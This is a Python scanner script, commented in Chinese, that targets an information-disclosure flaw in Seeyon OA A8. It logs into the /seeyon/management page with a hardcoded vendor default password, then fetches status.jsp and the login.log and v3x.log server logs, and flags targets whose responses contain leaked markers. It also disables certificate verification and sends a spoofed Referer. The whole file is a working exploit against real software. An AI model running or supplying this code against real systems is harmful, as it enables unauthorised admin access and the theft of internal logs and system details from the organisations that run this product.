#!/usr/bin/env python
# coding=utf-8
#致远OAA8status.jsp信息泄露漏洞
import requests, threading
from termcolor import colored

requests.packages.urllib3.disable_warnings()  # 忽略证书报错

results = ''


def pscan_vuln(url):
    global results
    try:
        sessions = requests.Session()
        data = 'password=WLCCYBD%40SEEYON'
        headers={
            'Referer':'http://lijiejietest.alabama.huatai.com:888/seeyon/management/index.jsp',
            'Set - Cookie': 'JSESSIONID = 8B028A444B4F063BA46E6B2356D1B278'
        }
        response = sessions.post(url=url + '/seeyon/management/index.jsp', data=data,headers=headers,verify=False, timeout=20)
        log = sessions.get(url+'/seeyon/logs/login.log')#Logout:
        file = sessions.get(url + '/seeyon/management/status.jsp')#java.io.tmpdir=
        v3x = sessions.get(url + '/seeyon/logs/v3x.log')#[QuartzScheduler_Worker-1]  INFO AccountDaoBean:29
        if 'Logout:' in log.text or 'java.io.tmpdir=' in file.text or '[QuartzScheduler_Worker-1]  INFO AccountDaoBean:29' in v3x.text:
            print(colored('[+]存在致远OAA8status.jsp信息泄露漏洞', 'red'))
            results = f'{url}-->存在致远OAA8status.jsp信息泄露漏洞'
        else:
            print('[-]不存在致远OAA8status.jsp信息泄露漏洞')
    except:
        print('[-]不存在致远OAA8status.jsp信息泄露漏洞')


def zyOAA8status(urls):
    threads = []
    t = threading.Thread(target=pscan_vuln, args=(str(urls),))
    threads.append(t)
    t.start()
    for t in threads:
        t.join()
    return results
